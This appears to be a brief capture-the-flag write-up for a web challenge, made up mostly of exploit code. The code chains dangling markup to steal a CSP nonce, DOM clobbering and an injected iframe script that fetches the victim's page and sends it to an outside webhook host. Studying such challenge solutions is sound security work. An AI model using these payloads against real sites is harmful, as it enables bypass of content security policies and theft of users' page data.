### tldr
Dangling Markup to Steal CSP nonce, Appcache to Reuse The nonce, DOM Clobbering with document.referrer to Inject our Code to iframe srcdoc, Steal / and send it to Our Server

```html
<a id=bad1 href=tel:%22>x</a>
<a id=bad2 href=tel:%3E>x</a>
<a id=bad3 href=tel:%3C>x</a>
<a id=bad4 href=tel:%27>x</a>

<a id=good1 href='tel:"'>x</a>
<a id=good2 href='tel:>'>x</a>
<a id=good3 href='tel:<'>x</a>
<a id=good4 href="tel:'">x</a>

<meta http-equiv="refresh" content="7;URL=http://mydomain/j.php?x= 
```

`http://mydomain/j.php` Contents:

```html
<?php
header('Referrer-Policy: unsafe-url');
?>

<script>

let v =new URL(location.href).searchParams.get('x');

let nonce=v.substr(v.indexOf('nonce')+6,22);

history.replaceState(null,null,`?x=tel:%22tel:%3Etel:%3C/a/tel:%3Etel:tel:%3Ciframe/srcdoc=slawtel:%3Cscript/nonce=${nonce}&gt;fetch(\`/\`).then(response=&gt;response.text()).then(jj=&gt;top.location=\`https://webhook.site/xxx?x=\`+jj.substr(900))//&lt;/script&gt;tel:%3E`)

location='http://politernotepad.zajebistyc.tf/note/ptqvkoVamyPwPJCtaukIeDJpuWUVEt'

</script>
```

My solution by far is the longest and I made it too hard for myself it could be much easier
